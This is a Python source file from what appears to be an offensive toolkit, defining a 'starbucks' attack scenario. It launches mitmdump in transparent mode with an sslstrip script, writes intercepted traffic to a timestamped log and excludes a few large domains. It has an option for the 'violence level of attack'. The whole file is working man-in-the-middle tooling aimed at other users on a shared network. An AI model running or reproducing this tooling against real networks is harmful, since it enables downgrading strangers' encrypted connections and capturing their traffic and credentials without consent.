import sys
import os
import shlex
import subprocess
from pwntk.base_scenario import BaseScenario
from pwntk.utils.environment import is_dev
from pwntk.utils.file import timestamp_file
from pwntk.utils.logger import print_kill_pid, print_check
from pwntk.scenarios.starbucks.setup import ensure_scripts_folder, download_scripts
from pwntk.vars import vars

__all__ = ["StarbucksScenario"]

processes = []


class StarbucksScenario(BaseScenario):
    name = "starbucks"
    # programs = ["mitmdump", "ettercap"]
    programs = ["mitmdump"]
    files = [f"{vars.get('pwntk_home')}/mitmproxy/scripts/sslstrip.py"]
    mode: int = 2
    path: str = None
    ignored_domains = ["facebook", "google", "gmail", "apple"]

    def build_ignored_regex(self) -> str:
        d = "\.com|".join(self.ignored_domains)
        return f"^(.+\.)?({d}):443$"

    def setup(self):
        ensure_scripts_folder()
        download_scripts()

    def run(self):
        ignored_domains_regex = self.build_ignored_regex()
        path_to_file = os.path.join(self.path, timestamp_file("mitmdump.log"))
        cmd = f"{self.programs[0]} --scripts {self.files[0]} --mode transparent -w {path_to_file} --ignore-hosts {ignored_domains_regex}"
        print(f"Executing: {cmd}")
        mitmdump = subprocess.Popen(shlex.split(cmd))
        processes.append(mitmdump)

    def validate_options(self, parser):
        parser.add_argument("-m", "--mode", action="store", default=2,
                            help="Violence level of attack (1,2,3). The default is 2")
        parser.add_argument("-p", "--path", action="store", required=True,
                            help="Path of output")

        args, _ = parser.parse_known_args()
        self.mode = args.mode
        self.path = args.path


def clean_up():
    print("Cleaning up:")
    if len(processes) == 0:
        print("\tNo processes to clean")
    else:
        for p in processes:
            print_kill_pid(p.pid)
            p.kill()
        print_check("Finished cleaning processes")


if is_dev():
    import atexit

    atexit.register(clean_up)
